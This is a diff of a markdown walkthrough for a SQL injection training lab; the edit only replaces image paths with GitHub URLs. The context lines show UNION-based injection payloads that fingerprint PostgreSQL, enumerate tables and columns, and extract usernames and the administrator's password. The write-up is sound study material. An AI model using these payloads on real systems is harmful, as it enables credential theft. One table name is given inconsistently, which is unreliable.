@@ -10,7 +10,7 @@ Query the database to retrieve database type.
 ' UNION SELECT version(), NULL--
 ```
 
-![](./images/7d252cd7c0a3_001.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/Examining_the_database_in_SQL_injection_attacks./images/7d252cd7c0a3_001.png)
 
 **It returns:**
 
@@ -24,17 +24,17 @@ PostgreSQL 11.12 (Debian 11.12–1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by
 
 Determine the table names.
 
-![](./images/7d252cd7c0a3_002.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/Examining_the_database_in_SQL_injection_attacks./images/7d252cd7c0a3_002.png)
 
 ```text
 ' UNION SELECT table_name, NULL FROM information_schema.tables
 ```
 
-![](./images/7d252cd7c0a3_003.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/Examining_the_database_in_SQL_injection_attacks./images/7d252cd7c0a3_003.png)
 
 Let’s search for a table that contains usernames and passwords.
 
-![](./images/7d252cd7c0a3_004.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/Examining_the_database_in_SQL_injection_attacks./images/7d252cd7c0a3_004.png)
 
 There is a table named `users_wfixez`** **this might be the table we are looking for. So let’s try retrieving columns of that table.
 
@@ -46,7 +46,7 @@ Determine the column names of the table `users_wfixez`
 ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_wfixez'--
 ```
 
-![](./images/7d252cd7c0a3_005.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/Examining_the_database_in_SQL_injection_attacks./images/7d252cd7c0a3_005.png)
 
 **There are two columns in the table **`users_hwlzhs`**.**
 
@@ -62,7 +62,7 @@ Retrieve the administrator’s password from the database.
 '+UNION+SELECT+password_xvbkii,username_wwmyan+FROM+users_wfixez--
 ```
 
-![](./images/7d252cd7c0a3_006.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/Examining_the_database_in_SQL_injection_attacks./images/7d252cd7c0a3_006.png)
 
 |  |  |
 |---|---|
